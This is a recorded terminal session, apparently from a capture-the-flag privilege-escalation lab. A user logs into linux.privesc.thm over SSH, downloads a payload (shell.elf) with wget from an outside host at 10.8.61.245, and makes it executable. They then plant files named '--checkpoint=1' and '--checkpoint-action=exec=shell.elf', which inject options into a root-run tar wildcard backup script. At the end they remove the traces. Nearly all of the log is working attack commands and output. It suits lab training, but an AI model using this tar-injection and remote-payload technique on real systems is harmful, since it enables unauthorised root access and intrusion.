@@ -1,0 +1,43 @@
+Script started on 2025-03-22 11:59:25+03:00 [COMMAND="ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@linux.privesc.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+user@linux.privesc.thm's password: 
+Permission denied, please try again.
+user@linux.privesc.thm's password: 
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Mar 22 04:55:46 2025 from ip-10-8-61-245.eu-west-1.compute.internal
+]0;user@debian: ~user@debian:~$ wget http://10.8.61.245/shell.elf
+--2025-03-22 05:04:51--  http://10.8.61.245/shell.elf
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 194 [application/octet-stream]
+Saving to: “shell.elf”
+
+ 0% [                                                               ] 0           --.-K/s              100%[==============================================================>] 194         --.-K/s   in 0s      
+
+2025-03-22 05:04:52 (66.4 MB/s) - “shell.elf” saved [194/194]
+
+]0;user@debian: ~user@debian:~$ ls
+myvpn.ovpn  [0m[01;32moverwrite.sh[0m  shell.elf  [01;34mtools[0m
+]0;user@debian: ~user@debian:~$ chmod +x /home/user/shell.elf
+]0;user@debian: ~user@debian:~$ touch /home/user/--checkpoint=1
+]0;user@debian: ~user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
+]0;user@debian: ~user@debian:~$ cat /usr/local/bin/compress.sh
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+]0;user@debian: ~user@debian:~$ ls
+--checkpoint=1  --checkpoint-action=exec=shell.elf  myvpn.ovpn  [0m[01;32moverwrite.sh[0m  [01;32mshell.elf[0m  [01;34mtools[0m
+]0;user@debian: ~user@debian:~$ rm /home/user/shell.elf
+]0;user@debian: ~user@debian:~$ rm /home/user/--checkpoint=1
+]0;user@debian: ~user@debian:~$ rm /home/user/--checkpoint-action=exec=shell.elf
+]0;user@debian: ~user@debian:~$ exit
+logout
+Connection to linux.privesc.thm closed.
+
+Script done on 2025-03-22 12:08:02+03:00 [COMMAND_EXIT_CODE="0"]
